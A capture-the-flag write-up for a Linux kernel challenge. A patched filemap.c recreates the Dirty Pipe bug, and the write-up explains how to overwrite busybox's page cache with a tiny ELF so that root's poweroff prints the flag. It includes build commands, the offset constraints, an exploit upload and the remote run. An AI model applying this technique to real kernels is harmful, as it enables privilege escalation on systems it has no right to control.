# Excalipipe

**Point: 476**

問おう。あなたがわたしのマスターか？

(Please solve this challenge locally before connecting to the remote server.)

nc chal-gcp.thjcc.org 13371

Notice:

The main files to focus on for this challenge are located in the src/challenge/ directory.
When you connect to the server, it will require solving a PoW. The PoW solver script is located at solver/solve_pow.py.
After solving PoW, the server will ask if you want to upload your exploit — provide the URL of your exploit file to do so.
When QEMU startup, you can find your exploit at /tmp/e.
If you have any problem about linux kernel challenge environment, please refer to the challenge others source code.

## 1. Understand the bug

Check `src/challenge/diff.patch`.

The patch in `mm/filemap.c` changed pipe buffer initialization from a full struct assignment to field-by-field assignment, so `pipe_buffer.flags` is left uninitialized.

That recreates the Dirty Pipe primitive: stale `PIPE_BUF_FLAG_CAN_MERGE` can stay set after `splice()`, then `write()` to the pipe modifies page cache of readonly files.

## 2. Understand challenge runtime

Check `initramfs/init`.

Important behavior:

- Exploit file from upload is attached as `/dev/sda`
- Boot script copies it to `/tmp/e` and makes it executable
- User shell runs as UID 1000
- After shell exits, root runs `poweroff`

So the plan is:

1. Run `/tmp/e` as user.
2. Dirty Pipe overwrite `/bin/busybox` page cache with our tiny ELF.
3. Type `exit`.
4. Root `poweroff` executes overwritten busybox code and prints flag.

## 3. Why overwrite `/bin/busybox`

Most commands in this initramfs are symlinks to busybox, including `poweroff`.

Overwriting busybox page cache gives code execution in the root shutdown path without needing direct privilege escalation in user shell.

## 4. Dirty Pipe constraints that must be respected

In this challenge, reliable overwrite must follow:

- `offset > 0`
- `offset` must not be page-aligned
- write must stay inside one page

So:

- splice at `offset - 1`
- write starting from payload byte 1
- keep payload under one page

This is implemented in `exploit_busybox_tiny.c`.

## 5. Build tiny payload + exploit

`payload.c` is a minimal static ELF that opens `/flag.txt` and writes it to stdout.

Build from project root:

```powershell
docker run --rm -v "${PWD}:/work" -w /work gcc:15 bash -lc "set -euo pipefail; \
gcc -nostdlib -static -Os -s -fno-asynchronous-unwind-tables -fno-stack-protector -no-pie -Wl,--build-id=none,-N payload.c -o payload_tiny; \
objcopy --input binary --output elf64-x86-64 --binary-architecture i386:x86-64 payload_tiny payload_tiny_blob.o; \
gcc -static -O2 -s exploit_busybox_tiny.c payload_tiny_blob.o -o exploit_busybox_tiny; \
wc -c payload_tiny exploit_busybox_tiny"
```

Expected payload size is small (example used: `768` bytes).

## 6. Prepare an upload URL

Challenge server downloads with Python `requests`, so you need a direct-download URL.

One working method:

```powershell
Copy-Item -Force exploit_busybox_tiny exploit_busybox_tiny.txt
curl.exe -F "file=@exploit_busybox_tiny.txt" https://tmpfiles.org/api/v1/upload
```

API returns something like:

- `http://tmpfiles.org/25475117/exploit_busybox_tiny.txt`

Use direct-download form:

- `https://tmpfiles.org/dl/25475117/exploit_busybox_tiny.txt`

## 7. Local verification first (required)

Start local challenge service:

```powershell
docker compose up -d --build
```

Run automated session (PoW + upload + `/tmp/e` + `exit`):

```powershell
python -u auto_run_session.py --host 127.0.0.1 --port 13371 --url https://tmpfiles.org/dl/25475117/exploit_busybox_tiny.txt
```

You should see:

- `/tmp/e` output says busybox overwritten
- after `exit`, flag output appears (local test flag)

## 8. Remote exploitation

Run the same script against remote:

```powershell
python -u auto_run_session.py --host chal-gcp.thjcc.org --port 13371 --url https://tmpfiles.org/dl/25475117/exploit_busybox_tiny.txt
```

Observed remote result:

```text
FLAG: THJCC{pipe_and_pipe_and_pipe_and_pipe_and_pipe_or_pipe???}
```

## 9. Manual remote method (if not using script)

1. Connect:
   - `nc chal-gcp.thjcc.org 13371`
2. Read prefix and solve PoW:
   - `python solver/solve_pow.py <PREFIX>`
3. Send answer.
4. Reply `y` to upload prompt.
5. Send exploit URL (`https://tmpfiles.org/dl/...`).
6. At shell prompt run:
   - `/tmp/e`
   - `exit`
7. Read flag from output.

## 10. Common failure cases

- URL returns HTML instead of binary:
  - Use direct-download endpoint (`/dl/...`).
- Connection closes before shell:
  - Usually URL fetch failed server-side.
- Exploit prints success but no flag:
  - Payload too large (crosses page boundary) or wrong offset logic.
- Overwrite attempt fails:
  - Ensure `offset=1`, `splice(offset-1)`, write payload from byte 1.
